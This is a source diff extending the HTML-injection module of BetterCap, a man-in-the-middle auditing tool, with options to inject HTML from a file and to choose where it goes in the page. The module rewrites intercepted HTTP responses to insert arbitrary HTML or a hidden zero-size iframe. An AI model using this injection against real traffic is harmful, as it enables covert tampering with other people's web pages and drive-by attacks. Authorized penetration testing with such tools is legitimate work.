@@ -5,7 +5,7 @@ BETTERCAP
 
 Author : Simone 'evilsocket' Margaritelli
 Email  : evilsocket@gmail.com
-Blog   : http://www.evilsocket.net/
+Blog   : https://www.evilsocket.net/
 
 This project is released under the GPL 3 license.
 
@@ -25,6 +25,8 @@ class InjectHTML < BetterCap::Proxy::HTTP::Module
   @@iframe = nil
   # HTML data to be injected.
   @@data = nil
+  # Position of the injection, 0 = just after <body>, 1 = before </body>
+  @@position = 0
 
   # Add custom command line arguments to the +opts+ OptionParser instance.
   def self.on_options(opts)
@@ -36,15 +38,31 @@ class InjectHTML < BetterCap::Proxy::HTTP::Module
       @@data = v
     end
 
+    opts.on( '--html-file PATH', 'Path of the html file to be injected.' ) do |v|
+      filename = File.expand_path v
+      raise BetterCap::Error, "#{filename} invalid file." unless File.exists?(filename)
+      @@data = File.read( filename )
+    end
+
     opts.on( '--html-iframe-url URL', 'URL of the iframe that will be injected, if this option is specified an "iframe" tag will be injected.' ) do |v|
       @@iframe = v
+    end
+
+    opts.on( '--html-position POSITION', 'Position of the injection, valid values are START for injecting after the <body> tag and END to inject just before </body>.' ) do |v|
+      if v == 'START'
+        @@position = 0
+      elsif v == 'END'
+        @@position = 1
+      else
+        raise BetterCap::Error, "#{v} invalid position, only START or END values are accepted."
+      end
     end
   end
 
   # Create an instance of this module and raise a BetterCap::Error if command
   # line arguments weren't correctly specified.
   def initialize
-    raise BetterCap::Error, "No --html-data or --html-iframe-url options specified for the proxy module." if @@data.nil? and @@iframe.nil?
+    raise BetterCap::Error, "No --html-file, --html-data or --html-iframe-url options specified for the proxy module." if @@data.nil? and @@iframe.nil?
   end
 
   # Called by the BetterCap::Proxy::HTTP::Proxy processor on each HTTP +request+ and
@@ -55,11 +73,15 @@ class InjectHTML < BetterCap::Proxy::HTTP::Module
       BetterCap::Logger.info "[#{'INJECTHTML'.green}] Injecting HTML code into #{request.to_url}"
 
       if @@data.nil?
-	 replacement = "<iframe src=\"#{@@iframe}\" frameborder=\"0\" height=\"0\" width=\"0\"></iframe></body>"
-        response.body.sub!( '</body>' ) {replacement}
+        replacement = "<iframe src=\"#{@@iframe}\" frameborder=\"0\" height=\"0\" width=\"0\"></iframe>"
       else
-	 replacement = "#{@@data}</body>"
-        response.body.sub!( '</body>' ) {replacement} 
+        replacement = "#{@@data}"
+      end
+
+      if @@position == 0
+        response.body.sub!( /<body([^>]*)>/i ) { "<body#{$1}>#{replacement}" }
+      else
+        response.body.sub!( /<\/body>/i ) { "#{replacement}</body>" }
       end
     end
   end
